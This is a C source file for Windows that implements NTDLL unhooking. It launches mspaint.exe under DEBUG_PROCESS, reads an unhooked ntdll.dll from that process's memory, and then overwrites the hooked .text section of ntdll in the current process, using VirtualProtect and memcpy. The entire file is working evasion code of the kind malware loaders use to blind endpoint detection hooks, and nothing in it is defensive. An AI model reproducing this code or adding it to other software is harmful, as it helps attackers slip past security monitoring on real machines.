#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "common.h"

// Function to Get NTDLL'S size from current process
SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

	// Parse the DOS header
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// Parse the NT headers
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// Return the NTDLL's size
	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

// Function to Get NTDLL'S address from current process
PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}

//Function to create a suspended process and read ntdll from it
BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuf) {

	CHAR	cWinPath[MAX_PATH / 2] = { 0 };
	CHAR	cProcessPath[MAX_PATH] = { 0 };

	PVOID	pNtdllModule = FetchLocalNtdllBaseAddress();
	PBYTE	pNtdllBuffer = NULL;
	SIZE_T	sNtdllSize = NULL,
		sNumberOfBytesRead = NULL;

	STARTUPINFO                    Si = { 0 };
	PROCESS_INFORMATION            Pi = { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Get the windows directory
	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// Create the process path
	sprintf_s(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s", cWinPath, lpProcessName);

	// Create the process
	if (!CreateProcessA(
		NULL,
		cProcessPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// allocating enough memory to read ntdll from the remote process
	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize)
		goto _EndOfFunc;
	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer)
		goto _EndOfFunc;

	// reading ntdll.dll
	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		printf("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
		goto _EndOfFunc;
	}

	// Saving ntdll to buffer
	*ppNtdllBuf = pNtdllBuffer;

	// terminating the process
	if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
		// process terminated successfully
	}


_EndOfFunc:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;

}


// Function to replace ntdll in current process
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,	// local hooked text section base address
		pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize = NULL;	// the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	//---------------------------------------------------------------------------------------------------------------------------

		// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

	//---------------------------------------------------------------------------------------------------------------------------

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL UnhookNtDLL() {

	PVOID pUnhookedNtdll = NULL;

	// Create a suspended process of mspaint.exe and read ntdll from it
	if (!ReadNtdllFromASuspendedProcess("mspaint.exe", &pUnhookedNtdll)) {
		printf("[!] Failed to read NTDLL from a suspended process.\n");
		return FALSE;
	}

	// Replace the NTDLL text section in the current process
	if (!ReplaceNtdllTxtSection(pUnhookedNtdll)) {
		printf("[!] Failed to replace NTDLL text section.\n");
		return FALSE;
	}

	// Free the allocated memory for the unhooked NTDLL
	if (pUnhookedNtdll) {
		HeapFree(GetProcessHeap(), 0, pUnhookedNtdll);
		printf("[+] Successfully Freed Memory.\n");
	}

	printf("[+] Successfully unhooked NTDLL.\n");
	return TRUE;
}